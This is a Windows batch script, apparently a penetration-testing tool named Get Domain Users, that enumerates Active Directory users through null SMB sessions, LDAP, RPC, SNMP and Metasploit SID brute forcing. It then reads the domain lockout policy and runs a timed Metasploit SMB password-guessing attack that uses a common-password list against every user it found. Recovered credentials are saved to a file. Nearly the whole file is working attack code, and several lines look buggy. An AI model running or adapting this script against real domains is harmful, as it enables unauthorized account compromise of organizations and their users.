@ECHO off
CLS

REM #################################################################
REM # Author and Stuff
REM #################################################################
REM # Script Name: Get Domain Users (GDU)
REM # Author: Scott Sutherland (nullbind) <scott.sutherland@netspi.com>
REM #
REM # Description:
REM # This script is intended to automate Windows domain user 
REM # enumeration using multiple methods, and initiate a 
REM # dictionary attack against the accounts with respect to the 
REM # acccount lockout policy.
REM #
REM # Technical Summary:
REM # 1) Determine domain from IPCONFIG (option provided to override)
REM	# 2) Identify domain controllers via DNS server queries
REM # 3) Enumerate users via RCP endpoints with Dumpsec
REM # 4) Enumerate users via RCP endpoints with Enum
REM # 5) Enumerate users via RCP SID Brute forcing with the Metasploit
REM #    smb_lookupsid module
REM # 6) Enumerate users via SNMP default strings with the Metasploit
REM #    snmp_enumusers module
REM # 7) Enumerate password policy with Dumpsec
REM # 8) Conduct dictionary attack using top 20 rockyou password list 
REM #    against enumerated users with Metasploit smb_login module 
REM #    with respect to the password policy
REM #		
REM # Authentication Methods:
REM # Users can authenticate with one of three options during attack.
REM # 1) Null SMB Login
REM # 2) Trusted connection
REM # 3) Username and password
REM #
REM # Notes:
REM # 1) If no lockout policy exists, the dictionary attack will be 
REM #    aborted so it can be manually confirmed
REM # 2)If the lockout policy cannot be determined the dicitonary
REM #    attack will be aborted
REM #################################################################


REM -----------------------------------------------------------------
REM TODO
REM -----------------------------------------------------------------
REM - fix width of header to match longest lengh of text
REM - make inprogress password display pretty 
REM - add gda option that supports auth
REM - dumpsec - on first success stop and move on
REM - enum - on first success stop and move on
REM - add express option (stops after first successfull enumeration)
REM - Add check for required executables before running
REM - add null base/bind to ldap to run when null smb login session runs
REM -----------------------------------------------------------------


REM -------------------------------------------------------
REM PRE RUN CONFIGURATION OPTIONS
REM -------------------------------------------------------
REM ## SETUP EXECUTABLES PATHS
SET unixtoolspath="C:\unixtools\"
SET metasploitpath="C:\metasploit\"
SET enumpath="C:\Penetration Testing\Enum+\Enum+\enum.exe"
SET dumpsecpath="C:\Program Files (x86)\SystemTools\dumpsec.exe"

REM ## SETUP AUTHENTICATION VARIABLES
SET netuse_auth="" /user:""
SET enumauth=

REM ## SETUP CUSTOM DOMAIN (NOT ASSOCIATED WITH DHCP)
REM ## Example: SET custom_domain=company.local
IF [%2] equ [-c] SET custom_domain=%3
IF [%6] equ [-c] SET custom_domain=%7

REM ## SETUP COMMAND LINE SWITCHES
IF [%1] equ [] goto :SYNTAX
IF [%1] equ [-g] goto :GETGROUPSESS
IF [%1] equ [-n] goto :NULLSESSION
IF [%1] equ [-a] goto :AUTHENTICATE
IF [%1] equ [-t] goto :TRUSTEDCON


:SYNTAX
ECHO ------------------------------------------------------------------------------------
ECHO                                GET DOMAIN USERS (GDU)
ECHO ------------------------------------------------------------------------------------
ECHO  This script is intended to automate Windows domain user enumeration using multiple 
ECHO  methods (LDAP,RPC,and SNMP). It also includes options to automatically initiate a 
ECHO  dictionary attack against enumerated accounts under the constraints of the acccount 
ECHO  lockout policy. 
ECHO ------------------------------------------------------------------------------------
ECHO  Syntax: gdu [options]
ECHO.
ECHO   -n run the script with null smb login
ECHO   -t run the script with a trusted connection (current user)
ECHO   -a run script as an authenticated user
ECHO   -u user name to authenticate with
ECHO   -p password to authenticate with
ECHO   -c custom domain
ECHO ------------------------------------------------------------------------------------
ECHO  Examples (basic):
ECHO. 
ECHO   gdu -n 							
ECHO   gdu -t
ECHO   gdu -a -u "domain\user" -p password
ECHO.
ECHO  Examples (custom domain):
ECHO.
ECHO   gdu -n -c domain.com							
ECHO   gdu -t -c domain.com
ECHO   gdu -a -u "domain\user" -p password -c domain.com
GOTO :END

:AUTHENTICATE
IF [%5] equ [] ECHO Missing username or password && goto :END
SET enumauth=-u %3 -p %5
SET netuse_auth=/user:%3 %5
GOTO :NULLSESSION

:TRUSTEDCON
SET netuse_auth=
GOTO :NULLSESSION

:NULLSESSION
REM ## CHECK IF USERS WOULD LIKE TO AUTO EXEC A DICTIONARY ATTACK
ECHO Would you like the dictionary attack to auto execute?
set /p attack=Y/N (default N):
IF %attack% equ N GOTO :DHCP
IF %attack% equ y set attack=Y && GOTO :DHCP
IF %attack% equ Y GOTO :DHCP
SET attack=N && GOTO :DHCP

:DHCP
REM ## DISPLAY BANNER
cls
ECHO ------------------------------------------------------------------------------------
ECHO -                                                          						-
ECHO -                              GET DOMAIN USERS (GDU)                 			    -
ECHO -                                                          						-
ECHO ------------------------------------------------------------------------------------
ECHO                               Enumerating Domain Users                 
ECHO ------------------------------------------------------------------------------------
REM -------------------------------------------------------
REM GET CURRENT DOMAIN FROM IPCONFIG DHCP CONFIGURATION
REM -------------------------------------------------------
IF [%1] equ [-n] ECHO  [*]    INFO: Authentication method = NULLSESSION
IF [%1] equ [-a] ECHO  [*]    INFO: Authentication method = AUTHENTICATED USER
IF [%1] equ [-t] ECHO  [*]    INFO: Authentication method = TRUSTED CONNECTION
IF %attack% equ N ECHO  [*]    INFO: Dictionary attack DISABLED
IF %attack% equ Y ECHO  [*]    INFO: Dictionary attack ENABLED
ECHO  [*]  ACTION: Getting domain from DHCP configuration...

REM ## PARSE DOMAIN FROM IPCONFIG
ipconfig | find /I "." |  find /I "Connection-specific DNS Suffix  . : " | gawk -F " " "{print $6}" | find /v " "  | sort | uniq | find /I "."|sed -e "s/^[ \]*//" >target
SET /p target_domain= < target
IF EXIST target del target

REM ## SETUP CUSTOM DOMAIN IF VARIABLE HAS BEEN SET
IF [%target_domain%] equ [] ECHO  [-]  RESULT: FAILED && GOTO :END

IF [%custom_domain%] neq [] SET target_domain=%custom_domain% 
ECHO  [*]  RESULT: %target_domain%

REM ## CHECKING TOTAL NUMBER OF WORDS IN A DOMAIN AND SAVE AS TOTALVAR 
IF EXIST num_words del num_words
echo %target_domain%| gawk  -F "." "{ total = total + NF }; END { print total+0 }" > num_words
SET /p totalvar= < num_words
IF EXIST num_words DEL num_words

REM ## DEFINE DOMAIN PARAMETER TO BE USED LATER (e.g: var1=hacking, var2=lab, var3=local)
IF EXIST domainname del domainname
FOR /L %%G IN (1,1,%totalvar%) DO (echo %target_domain% | gawk -F "." "{print $%%G}" > %%G
SET /p var%%G= < %%G
gawk "BEGIN { while (a++<1) s=s \"dc=%%var%%G%%\"; print s }" >> domainname
DEL %%G )

REM ## PARSING DOMAIN VARIABLES FOR THE domain_parameters (e.g: dc=%var1%,dc=%var2%,dc=%var3%)
IF EXIST domainname_var del domainname_var
gawk "NR==1{x=$0;next}NF{x=x\",\"$0}END{print x}" domainname > domainname_var
DEL domainname

REM ## FIX PARSING ISSUES
IF EXIST domainname_var2 del domainname_var2
SET /p temp_var= < domainname_var
@echo %temp_var% | sed "s/'//" > domainname_var2
SET /p domain_parameter= < domainname_var2
IF EXIST domainname_var DEL domainname_var 
IF EXIST domainname_var2 DEL domainname_var2


REM -------------------------------------------------------
REM ENUMERATE DOMAIN CONTROLLERS WITH NSLOOKUP
REM -------------------------------------------------------
ECHO  [*]  ACTION: Getting list of DCs from DNS...

REM ## ENUMERATE DOMAIN CONTROLLERS
nslookup -type=SRV _ldap._tcp.%target_domain% 2>nul| find /I "internet address" | gawk -F " " "{print $5}" | uniq | sort > dcs.txt 2> NUL 

REM ## CHECK IF DOMAIN CONTROLLERS ARE UP
for /F "tokens=*" %%i in ('cat dcs.txt') do ping -n 2 %%i | grep -i "reply" | grep -i "bytes=" | gawk -F " " "{print $3}"| sed s/://g | uniq >> dcs_live.txt

REM ## UPDATE DC LIST
sort dcs_live.txt>dcs.txt

REM ## REMOVE TEMP FILE
IF EXIST dcs_live.txt DEL dcs_live.txt

REM ## GET DOMAIN CONTROLLER COUNT
wc -l dcs.txt | sed s/dcs.txt//g | sed -e "s/^[ \]*//" > dc_count
SET /P dc_count=<dc_count
IF EXIST dc_count del dc_count
if %dc_count% LEQ 0 ECHO  [-]  RESULT: FAILED && GOTO :END

REM ## PRINT NUMBER OF DOMAIN CONTROLLERS
ECHO  [*]  RESULT: Found %dc_count%domain controllers

REM ## PRINT LIST OF DOMAIN CONTROLLERS
for /F "tokens=*" %%i in ('type dcs.txt') do ECHO  [*]      DC: %%i


REM -------------------------------------------------------
REM CREATE SMB SESSION TO DCs WITH NET USE
REM -------------------------------------------------------
REM ## Establish smb login to each domain controller via native net use command
IF [%1] equ [-n] ECHO  [*]  ACTION: Establishing null SMB login to each DC...
IF [%1] equ [-a] ECHO  [*]  ACTION: Establishing authenticated login to each DC as %3...
FOR /F "tokens=*" %%i in ('type dcs.txt') do net use \\%%i\IPC$ %netuse_auth% 1>nul


:LDAP
REM -------------------------------------------------------
REM USER ENUMERATED WITH ADFIND (LDAP)
REM -------------------------------------------------------

REM ## DETERMINE IF LDAP SHOULD BE USED
IF [%1] equ [-n] ECHO  [*]    INFO: LDAP doesn't support null SMB login && GOTO :DUMPSEC
ECHO  [*]  ACTION: Attempting user enumeration with LDAP...

REM ## GET LIST OF USERS & PARSE INTO FILE
@adfind -b %domain_parameter% -f "objectcategory=user" -gc | grep -i "sAMAccountName:" | gawk -F ":" "{print $2}" | gawk -F " " "{print $1}"| gawk "!/\$/"| uniq | sort 2>nul 1> allusers.txt

REM ## GET USER COUNT
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g | uniq>user_count
SET /P user_count=<user_count

REM ## CLEAN UP COUNT FILES
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_ldap.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
IF %user_count% EQU 0 ECHO  [-]  RESULT: FAILED && GOTO :DUMPSEC

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_ldap.txt)

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :DUMPSEC


:DUMPSEC
REM -------------------------------------------------------
REM USER ENUMERATED WITH DUMPSEC (RPC ENDPOINTS)
REM -------------------------------------------------------
ECHO  [*]  ACTION: Attempting user enumeration via RPC ENDPOINTS(DUMPSEC)...

REM ## GET LIST OF USERS
FOR /F "tokens=*" %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2> nul

REM ## PARSE CLEAN LIST OF USERS
cat *_usrs.txt| gawk -F "," "{print $1}" | find /V "Somarsoft DumpSec"| find /V "NetQueryDisplayInformation"| find /V "UserName" | grep -v "^$" | grep -v "," | sort | uniq > allusers.txt

REM ## REMOVE TEMP FILES
FOR /F "tokens=*" %%i in ('type dcs.txt') do del %%i_usrs.txt

REM ## GET USER COUNT
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_rpc_dumpsec.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
IF %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :ENUMN

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_dumpsec.txt)

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :ENUMN


:ENUMN
REM -------------------------------------------------------
REM Run enum -N to enumerate users (RPC ENDPOINTS)
REM -------------------------------------------------------
ECHO  [*]  ACTION: Attempting user enumeration via RPC ENDPOINTS(ENUM -N)...

REM ## GET LIST OF USERS
IF [%1] equ [-t] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %%i >> allusers.txt
IF [%1] equ [-n] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %enumauth% %%i >> allusers.txt
IF [%1] equ [-a] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %enumauth% %%i >> allusers.txt

REM ## PARSE CLEAN LIST OF USERS
grep -i "(pass 1)... got" allusers.txt| wc -l | sed -e "s/^[ \]*//" > checkit
SET /P success=<checkit
IF EXIST checkit del checkit
IF %success% EQU 0 ECHO  [-]  RESULT: FAILED && GOTO :SNMPENUM
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $1}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $2}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $3}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $4}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $5}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $6}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $7}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $8}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $9}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $10}"  | sort | uniq >> clean.txt
cat clean.txt | grep -v "\$" | grep -v "^$" | grep -v "," |  sed -e "s/^[ \]*//"  | sort | uniq > allusers.txt
IF EXIST clean.txt del clean.txt

REM ## GET USER COUNT
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_rpc_enum.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
IF %user_count% EQU 0 ECHO  [-]  RESULT: FAILED && GOTO :SNMPENUM

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_enum.txt) 

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :SNMPENUM


:SNMPENUM
REM ----------------------------------------------------------------------
REM ENUMERATE USERS WITH SNMP_ENUMUSERS (SNMP)
REM -----------------------------------------------------------------------
ECHO  [*]  ACTION: Attempting user enumeration via SNMP Public string...

REM ## GET LIST OF USERS
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/snmp/snmp_enumusers COMMUNITY=Public RHOSTS=file:%mypwd%\\dcs.txt E 2> nul 1>> usrtmp.txt

REM ## PARSE CLEAN LIST OF USERS
grep -i "Found Users:" usrtmp.txt | gawk -F "Found Users:" "{print $2}" | tr , \n | sed -e "s/^[ \]*//" | sort | uniq 2>nul 1> allusers.txt

REM ## REMOVE TEMP FILES
IF EXIST usrtmp.txt del usrtmp.txt

REM ## GET NUMBER OF ENUMERATED USERS
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_snmp.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
if %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :SIDENUM

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_snmp.txt) 

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :SIDENUM


:SIDENUM
REM -------------------------------------------------------
REM ENUMERATE USERS WITH SMB_LOOKUPSID (RPC SID Brute Force)
REM -------------------------------------------------------
ECHO  [*]  ACTION: Attempting user enumeration via RPC SID BF (takes a while)...

REM ## BUILD FILE NAME FILE PATH FOR METASPLOIT VARIABLE
pwd > pwd.txt
cat pwd.txt | sed s/\\/\\\\/g > pwd2.txt
SET /P mypwd=<pwd2.txt
IF EXIST pwd.txt del pwd.txt
IF EXIST pwd2.txt del pwd2.txt

copy dcs.txt dclist.txt 2>nul 1>nul

:runsid
REM ## SETUP NEXT SCAN
head -n 1 dclist.txt > dc_target.txt
head -n 1 dclist.txt >> dcs_scanned.txt
diff -iw -d dclist.txt dcs_scanned.txt | grep -i "<" | grep -v "^$" | sed -e "s/^[ \]*//" | grep -v "\," | gawk -F " " "{print $2}" > dclist.txt

REM ## GET LIST OF USERS for first server
Ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_lookupsid THREADS=15 MaxRID=10000 SMBDomain=. RHOSTS=file:%mypwd%\\dc_target.txt E 2> nul 1>> usrtmp.txt

REM ## CHECK IF SUCCESSFUL
grep -i "user=" usrtmp.txt | wc -l | sed -e "s/^[ \]*//" > dc_success
SET /P dc_success=<dc_success
IF %dc_success% GEQ 1 GOTO :runsidcomplete

REM ## GET LINE COUNT of dclist.txt
wc -l dclist.txt  | sed s/dclist.txt //g | sed -e "s/^[ \]*//" > dc_pending_count
SET /P dc_pending_count=<dc_pending_count

REM IF dclist.txt IS NOT EMPTY TRY NEXT DC
IF %dc_pending_count% GEQ 1 GOTO :runsid

:runsidcomplete
REM ## CLEAN  UP TEMP FILES
IF EXIST dclist.txt DEL dclist.txt
IF EXIST dc_target.txt DEL dc_target.txt
IF EXIST dcs_scanned.txt DEL dcs_scanned.txt
IF EXIST dc_success DEL dc_success

REM ## PARSE CLEAN LIST OF USERS
grep -i "user=" usrtmp.txt | gawk -F " " "{print $3}" | gawk -F "USER=" "{print $2}" | grep -v "\$" |gawk "!/\$/" | sort | uniq 2>nul 1> allusers.txt
IF EXIST usrtmp.txt del usrtmp.txt

REM ## GET NUMBER OF ENUMERATED USERS
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_rpc_sidbf.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
if %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :USERCHECK

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_sidbf.txt) 

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :USERCHECK


:USERCHECK
REM -------------------------------------------------------
REM VERIFY USERS WHERE ENUMERATED BEFORE ATTACKING
REM -------------------------------------------------------

REM ## DUMP ALL USERS FROM ALL PROTOCOLS INTO allusers.txt
cat domain_users*.txt |sort|uniq > allusers.txt

REM ## GET NUMBER OF USERS ENUMERATED
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count

REM ## NOTIFY USER IF NO USERS WHERE ENUMERATED
IF %user_count% EQU 0 ECHO  [*]     INFO: No users enumerated && DEL allusers.txt && GOTO :END

REM ## CHECK IF USER WANTS AUTO DICTIONARY ATTACK
IF %attack% equ N GOTO :END

REM ## ATTACK IF USERS WHERE ENUMERATED & Dictionary attack is requested
GOTO :GETPOLICY


:GETPOLICY	
REM ## CHECK IF AUTOMATED DICTIONARY ATTACK IS ENABLED
IF %attack% equ N GOTO :END

REM -------------------------------------------------------
REM  ENUMERATE PASSWORD POLICY FROM DOMAIN CONTROLLER
REM -------------------------------------------------------
REM ECHO  [*]  ACTION: Attempting policy enumeration with DUMPSEC...

REM ## GET LOCKOUT POLICY
%dumpsecpath% /computer=\\%mydc% /rpt=policy /saveas=csv /outfile=pwpolicy.txt 2> nul
grep -i "Lockout after " pwpolicy.txt | sed s/"Lockout after"//g | sed s/"bad logon attempts"//g | grep -v "^$" | sed -e "s/^[ \]*//">lockout

REM ## GET COUNT RESET
grep -i "Reset bad logon count after 15 minutes" pwpolicy.txt | gawk -F " " "{print $6}" | grep -v "^$" | sed -e "s/^[ \]*//" >countreset

REM ## SETUP VARIABLES
set /P countreset=<countreset
set /P lockoutafter=<lockout
set /A attempts=%lockoutafter%-2

REM ## CLEAN UP TEMP FILES
IF EXIST pwpolicy.txt DEL pwpolicy.txt 
IF EXIST lockout DEL lockout
IF EXIST countreset DEL countreset

REM ## IF NO PASSWORD POLICY EXISTS ABORT DICTIONARY ATTACK - needs to be tested
IF %lockoutafter% EQU 0 ECHO  [*]   RESULT: No password policy exist, please confirm and attack manually!
IF %lockoutafter% EQU 0 ECHO  [*]   RESULT: Automated dictionary attack aborted! && GOTO :END

REM ## IF SUCESSFULL ELSE GOTO END
IF %attempts% GEQ 1 GOTO :DATTACK
ECHO  [*]   RESULT: Password policy could not be determined!
ECHO  [*]   RESULT: Automated dictionary attack aborted!
GOTO :END


:DATTACK
REM -------------------------------------------------------
REM ATTEMPT DICTIONARY ATTACK AGAINST DC
REM -------------------------------------------------------
ECHO ------------------------------------------------------------------------------------
ECHO                                Starting Dictionary Attack 
ECHO ------------------------------------------------------------------------------------
REM ## GET DATE
FOR /F "tokens=*" %%i in ('date /t') do SET mydate=%%i

REM ## GET TIME
FOR /F "tokens=*" %%i in ('time /t') do SET mytime=%%i

REM ## PRINT START TIME
ECHO  [*]    INFO: START TIME is %mydate% %mytime%

REM ## COMBINE USER LISTS
cat domain_users*.txt | sort | uniq 2>nul 1>allusers.txt

REM ## GET NUMBER OF ENUMERATED USERS
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count

REM ## GENERATE DICTIONARY FILE FOR ATTACK
REM ## NOTE: Some of the psswords below should be changed manually
REM ##       but mainly its rocku.  Also, blank and username as pass
REM ##       will be done via the smb_login module.
IF EXIST list_pending.txt DEL list_pending.txt
touch list_pending.txt
ECHO companyname>> list_pending.txt
ECHO Companyname>> list_pending.txt
ECHO !!getitdone!!>> list_pending.txt
REM ECHO Companyname1>> list_pending.txt
REM ECHO companyname1>> list_pending.txt
REM EcHO Companyname12>> list_pending.txt
REM EcHO companyname12>> list_pending.txt
REM ECHO Password>> list_pending.txt
REM ECHO password>> list_pending.txt
REM ECHO Password1>> list_pending.txt
REM ECHO password1>> list_pending.txt
REM ECHO P@ssw0rd1>> list_pending.txt
REM ECHO Password12>> list_pending.txt
REM ECHO password123>> list_pending.txt
REM ECHO Password123>> list_pending.txt
REM ECHO 12345>> list_pending.txt
REM ECHO 123456>> list_pending.txt
REM ECHO 654321>> list_pending.txt
REM ECHO 1234567>> list_pending.txt
REM ECHO 12345678>> list_pending.txt
REM ECHO 123456789>> list_pending.txt
REM ECHO 1234asdf>> list_pending.txt
REM ECHO Summer2011>> list_pending.txt
REM ECHO Fall2011>> list_pending.txt
REM ECHO Winter2011>> list_pending.txt
REM ECHO Winter2012>> list_pending.txt
REM ECHO Spring2012>> list_pending.txt
REM ECHO qwerty>> list_pending.txt
REM ECHO Qwerty>> list_pending.txt
REM ECHO abc123>> list_pending.txt
REM ECHO letmein>> list_pending.txt
REM ECHO opensesme>> list_pending.txt
REM ECHO monkey>> list_pending.txt
REM ECHO Monkey>> list_pending.txt
REM ECHO myspace1>> list_pending.txt
REM ECHO link182>> list_pending.txt
REM ECHO liverpool>> list_pending.txt
REM ECHO iloveyou>> list_pending.txt
REM ECHO rockyou>> list_pending.txt
REM ECHO princess>> list_pending.txt
REM ECHO thomas>> list_pending.txt
REM ECHO Nicole>> list_pending.txt
REM ECHO Daniel>> list_pending.txt
REM ECHO babygirl>> list_pending.txt
REM ECHO michael>> list_pending.txt
REM ECHO Ashley>> list_pending.txt
REM ECHO yuiop>> list_pending.txt
 
REM ## Get number of passwords to be used
wc -l  list_pending.txt | sed -e "s/^[ \]*//" | sed s/list_pending.txt//g> pwcount
SET /P pwcount=<pwcount
IF EXIST pwcount del pwcount

REM ## add 2 to pwcount; 1 blank;1 username as pw (built into smb_login)
SET /A pwcount=%pwcount%+2 

REM ## GET PRESENT WORKING DIRECTORY
pwd > pwd.txt
SET /P mydir=<pwd.txt
IF EXIST pwd.txt DEL pwd.txt

REM ## MODIFY PATH FOR METASPLOIT
echo %mydir%| sed s/\\/\\\\/g > pwd.txt
SET /P mydir=<pwd.txt

IF EXIST pwd.txt DEL pwd.txt

REM ## GET TARGET DC
head -n 1 dcs.txt > targetdc.txt
set /p targetdc=<targetdc.txt
IF EXIST targetdc.txt del targetdc.txt

REM ## PRINT DICTIONARY CONFIGURATION INFO
ECHO  [*]    INFO: %targetdc% loaded as target
ECHO  [*]    INFO: %pwcount% passwords loaded 
ECHO  [*]    INFO: %user_count%users loaded
ECHO  [*]    INFO: %lockoutafter% attempts can be made before accounts lockout
ECHO  [*]    INFO: %countreset% is the lockout counter reset time
ECHO  [*]    INFO: %attempts% passwords will be tested every %countreset% minutes
ECHO  [*]  ACTION: Starting dictionary attack (takes a while)...

REM ## EXECUTE DICTIONARY ATTACK WITH BLANK PASSWORD AND USERNAME AS PASSWORD
ECHO  [*]  ACTION: Testing for blank passwords and username as password...
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=TRUE USER_AS_PASS=TRUE USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2> nul 1>> creds.txt

REM ## SHOW AQUIRED PASSWORDS FOR ROUND
ECHO  [*]  ACTION: Potentially recover passwords:
grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 } >>tmp_list.txt
FOR /F "tokens=*" %%i in ('type tmp_list.txt') do echo ECHO  [*] Account:%%i 
IF EXIST tmp_list.txt DEL tmp_list.txt

REM ## SLEEP FOR NUMBER OF MINUTES DEFINED BY PASSWORD POLICY
ECHO  [*]  ACTION: Waiting for counter to reset (%countreset% minutes)...
sleep %countreset%m

:RUN
REM ## SETUP PASSWORD FILES FOR SCAN
head -n %attempts% list_pending.txt > list_targets.txt
head -n %attempts% list_pending.txt >> list_scanned.txt
diff -iw -d list_pending.txt list_scanned.txt | grep -i "<" | grep -v "^$" | sed -e "s/^[ \]*//" | grep -v "\," | gawk -F " " "{print $2}" > list_pending.txt

REM ## DISPLAY PASSWORDS TO BE TESTED
ECHO  [*]  ACTION: Testing the %attempts% passwords below:
FOR /F "tokens=*" %%i in ('cat list_targets.txt') do ECHO  [*]          Pasword: %%i

REM ## EXECUTE DICTIONARY ATTACK
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=FALSE USER_AS_PASS=FALSE PASS_FILE=%mydir%\\list_targets.txt USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2> nul 1>> creds.txt

REM ## SHOW AQUIRED PASSWORDS FOR ROUND
ECHO  [*]  ACTION: Potentially recover passwords:
grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 } >>tmp_list.txt
FOR /F "tokens=*" %%i in ('type tmp_list.txt') do echo ECHO  [*] Account:%%i 
IF EXIST tmp_list.txt DEL tmp_list.txt

REM ## SLEEP FOR NUMBER OF MINUTES DEFINED BY PASSWORD POLICY
ECHO  [*]  ACTION: Waiting for counter to reset (%countreset% minutes)...
sleep %countreset%m

REM ## GET LINE COUNT OF LIST_PENDING.TXT
wc -l list_pending.txt | sed s/list_pending.txt//g | sed -e "s/^[ \]*//" > line_count
SET /P line_count=<line_count

REM IF LIST_PENDING.TXT IS NOT EMPTY TRY NEXT GROUP OF PASSWORDS
IF %line_count% GEQ 1 SET GOTO :RUN
IF %line_count% EQU 0 ECHO  [*]  ACTION: Dictionary attack completed.

REM ## CLEAN UP TEMP FILES
IF EXIST list_pending.txt DEL list_pending.txt
IF EXIST list_targets.txt DEL list_targets.txt
IF EXIST list_scanned.txt DEL list_scanned.txt
IF EXIST line_count DEL line_count

REM # PARSE RECOVERED USERSNAME AND PASSWORDS
grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 }" > domain_passwords.txt
IF EXIST creds.txt del creds.txt

REM ## GET NUMBER CREDENTIALS
wc -l domain_passwords.txt | sed -e "s/^[ \]*//" | sed s/domain_passwords.txt//g>cred_count
SET /P cred_count=<cred_count

REM ## REMOVE TEMP FILES
IF EXIST cred_count del cred_count

REM ## CHECK FOR FAILURE
IF %cred_count% EQU 0 ECHO  [*]  RESULT: No weak passwords were found && goto :END

REM ## PRINT NUMBER OF CREDETIALS RECOVERED
ECHO  [*]   RESULT: %cred_count% passwords were found

REM ## PRINT CREDENTIALS
FOR /F "tokens=*" %i in ('type domain_passwords.txt') do ECHO  [*]  ACCOUNT:%%i

REM ## GET DATE
FOR /F "tokens=*" %%i in ('date /t') do SET mydate=%%i

REM ## GET TIME
FOR /F "tokens=*" %%i in ('time /t') do SET mytime=%%i

REM ## PRINT THE END TIME
ECHO  [*]    INFO: END TIME is %mydate% %mytime%

:END
